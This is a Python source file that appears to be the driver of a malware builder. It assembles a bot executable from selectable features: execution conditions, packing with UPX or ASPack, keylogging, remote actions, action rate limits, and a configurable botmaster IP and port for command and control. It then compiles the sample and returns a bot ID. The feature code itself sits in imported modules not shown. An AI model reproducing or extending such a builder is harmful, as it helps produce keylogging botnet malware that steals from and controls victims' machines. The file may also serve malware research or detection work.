import MalwareFeatures
import CodeManager

# main function
# returns a string containing the path to the exe, -1 on failure
def main(features):
    codeManager = CodeManager.CodeManager()
    # add basic things to the bot, standard includes, an id ...
    codeManager.start_basic_bot_sample()
    # malwareFeatures = []
    for feat in features['Execution Conditions']:
        featObj = codeManager.create_feature_object(feat)
        codeManager.add_malware_feature(featObj, 'Execution Conditions')
    for feat in features['Options']:
        print(feat)
        if feat == 'Pack Using UPX':
            codeManager.add_post_compile_command('upx.exe {{exe_name}}')
        if feat == 'Pack Using ASPack':
            codeManager.add_post_compile_command('aspack.exe {{exe_name}}')
        featObj = codeManager.create_feature_object(feat)
        codeManager.add_malware_feature(featObj, 'Options')
    for feat in features['On Execution']:
        featObj = codeManager.create_feature_object(feat)
        codeManager.add_malware_feature(featObj, 'On Execution')
        # keylogging needs the botloop to send its data, if were doing Keylogging
        # on execute we are not guaranteed to have the loop, add it as a remote action to ensure we get the loop
        if featObj.name == "Keylogging":
            codeManager.add_malware_feature(featObj, 'As Remote Action')
    for feat in features['As Remote Action']:
        featObj = codeManager.create_feature_object(feat)
        codeManager.add_malware_feature(featObj, 'As Remote Action')
    for feat in features['Failed Condition Handler']:
        featObj = codeManager.create_feature_object(feat)
        codeManager.add_malware_feature(featObj, 'Failed Condition Handler')
    if 'Pull Times' in features:
        timeArray = features['Pull Times']
        codeManager.setBotPullTimes(timeArray)
    if 'Action Limit' in features:
        limit = features['Action Limit']
        codeManager.setActionLimitPerHour(limit)
    else:
        # if the user left the limit count field blank, having the time windows but no count would break the code
        codeManager.setActionLimitPerHour('3')
    if 'Action Frequency' in features:
        freq = features['Action Frequency']
        codeManager.setActionFrequency(freq)
    if 'Maximum Action Limit' in features:
        totalLimit = features['Maximum Action Limit']
        codeManager.setTotalActionLimit(totalLimit)
    # if the user has specified an ip or port, set them
    if 'Botmaster IP' in features:
        ip = features['Botmaster IP']
        codeManager.setBotmasterIP(ip)
    if 'Botmaster Port' in features:
        port = features['Botmaster Port']
        codeManager.setBotmasterPort(port)

    # builtSample = 'newSample.exe'
    sourceCodeFile = 'newSample.cpp'

    res, botID = codeManager.build_executable(sourceCodeFile)
    return res, botID

if __name__ == "__main__":
    main()
